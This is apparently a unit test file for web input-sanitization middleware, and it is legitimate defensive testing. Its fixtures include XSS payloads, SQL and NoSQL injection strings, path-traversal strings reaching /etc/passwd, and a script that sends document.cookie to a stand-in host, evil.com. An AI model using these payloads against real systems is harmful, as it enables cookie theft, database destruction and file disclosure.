import { describe, it, expect } from 'vitest';
import { inputSanitizationUtils } from '../../server/middleware/advanced-sanitization';

describe('Security Middleware Unit Tests', () => {
  describe('Input Sanitization Utils', () => {
    describe('XSS Sanitization', () => {
      it('should sanitize basic XSS attempts', () => {
        const maliciousInput = '<script>alert("xss")</script>Hello World';
        const sanitized = inputSanitizationUtils.sanitizeXSS(maliciousInput);

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('alert');
        expect(sanitized).toContain('Hello World');
      });

      it('should sanitize javascript: URLs', () => {
        const maliciousInput = 'javascript:alert("xss")';
        const sanitized = inputSanitizationUtils.sanitizeXSS(maliciousInput);

        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('alert');
      });

      it('should sanitize event handlers', () => {
        const maliciousInput = '<img src="x" onerror="alert(1)">';
        const sanitized = inputSanitizationUtils.sanitizeXSS(maliciousInput);

        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('alert');
      });

      it('should preserve safe content', () => {
        const safeInput = 'Hello World! This is safe content.';
        const sanitized = inputSanitizationUtils.sanitizeXSS(safeInput);

        expect(sanitized).toBe('Hello World! This is safe content.');
      });
    });

    describe('SQL Injection Detection', () => {
      it('should detect SQL injection patterns', () => {
        const sqlInjectionAttempts = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM users --",
          "admin'--",
          "' or 1=1 limit 1 -- -+",
        ];

        sqlInjectionAttempts.forEach(attempt => {
          expect(inputSanitizationUtils.detectSQLInjection(attempt)).toBe(true);
        });
      });

      it('should not flag safe SQL-like content', () => {
        const safeInputs = [
          'Hello world',
          'user@example.com',
          'This is a normal sentence.',
          'Product name: Widget-123',
        ];

        safeInputs.forEach(input => {
          expect(inputSanitizationUtils.detectSQLInjection(input)).toBe(false);
        });
      });
    });

    describe('NoSQL Injection Detection', () => {
      it('should detect NoSQL injection in objects', () => {
        const nosqlAttempts = [
          { $ne: null },
          { $gt: '' },
          { $where: 'function() { return true; }' },
          { $regex: '.*' },
        ];

        nosqlAttempts.forEach(attempt => {
          expect(inputSanitizationUtils.detectNoSQLInjection(attempt)).toBe(true);
        });
      });

      it('should detect NoSQL injection in strings', () => {
        const nosqlStrings = [
          '{"$where": "this.password == this.confirm"}',
          '{"$ne": null}',
          '$gt',
        ];

        nosqlStrings.forEach(str => {
          expect(inputSanitizationUtils.detectNoSQLInjection(str)).toBe(true);
        });
      });

      it('should not flag safe objects', () => {
        const safeObjects = [
          { name: 'John', age: 30 },
          { email: 'user@example.com' },
          'normal string',
          123,
        ];

        safeObjects.forEach(obj => {
          expect(inputSanitizationUtils.detectNoSQLInjection(obj)).toBe(false);
        });
      });
    });

    describe('Path Traversal Detection', () => {
      it('should detect path traversal attempts', () => {
        const pathTraversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....//....//....//etc/passwd',
        ];

        pathTraversalAttempts.forEach(attempt => {
          expect(inputSanitizationUtils.detectPathTraversal(attempt)).toBe(true);
        });
      });

      it('should not flag normal paths', () => {
        const normalPaths = [
          'documents/reports/2023/annual.pdf',
          '/home/user/documents',
          'C:\\Users\\Documents',
          'folder/subfolder/file.txt',
        ];

        normalPaths.forEach(path => {
          expect(inputSanitizationUtils.detectPathTraversal(path)).toBe(false);
        });
      });
    });

    describe('File Name Sanitization', () => {
      it('should sanitize dangerous file names', () => {
        const dangerousNames = [
          '../../../evil.exe',
          '<script>alert(1)</script>.jpg',
          'file|with|pipes.txt',
          'file with spaces and ??? special chars.pdf',
        ];

        dangerousNames.forEach(name => {
          const sanitized = inputSanitizationUtils.sanitizeFileName(name);

          expect(sanitized).not.toContain('../');
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('|');
          expect(sanitized).toMatch(/^[a-zA-Z0-9._-]+$/);
        });
      });

      it('should preserve safe file names', () => {
        const safeNames = ['document.pdf', 'report_2023.xlsx', 'image-final.jpg', 'data.123.csv'];

        safeNames.forEach(name => {
          const sanitized = inputSanitizationUtils.sanitizeFileName(name);
          expect(sanitized).toBe(name);
        });
      });

      it('should limit file name length', () => {
        const longName = 'a'.repeat(300) + '.txt';
        const sanitized = inputSanitizationUtils.sanitizeFileName(longName);

        expect(sanitized.length).toBeLessThanOrEqual(255);
      });
    });
  });

  describe('Security Patterns and Validation', () => {
    it('should correctly identify various XSS patterns', () => {
      const xssPatterns = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      ];

      xssPatterns.forEach(pattern => {
        const sanitized = inputSanitizationUtils.sanitizeXSS(pattern);

        // Should not contain dangerous elements
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('<iframe>');
        expect(sanitized).not.toContain('<object>');
        expect(sanitized).not.toContain('<meta>');
      });
    });

    it('should handle complex nested injection attempts', () => {
      const complexInput = `<script>
        var img = new Image();
        img.src = 'https://evil.com/steal?' + document.cookie;
        document.body.appendChild(img);
      </script>`;

      const sanitized = inputSanitizationUtils.sanitizeXSS(complexInput);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('document.cookie');
      expect(sanitized).not.toContain('appendChild');
    });

    it('should handle mixed content with safe and unsafe elements', () => {
      const mixedInput = 'Hello <script>alert("xss")</script> World <p>Safe content</p>';
      const sanitized = inputSanitizationUtils.sanitizeXSS(mixedInput);

      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('World');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });
  });
});
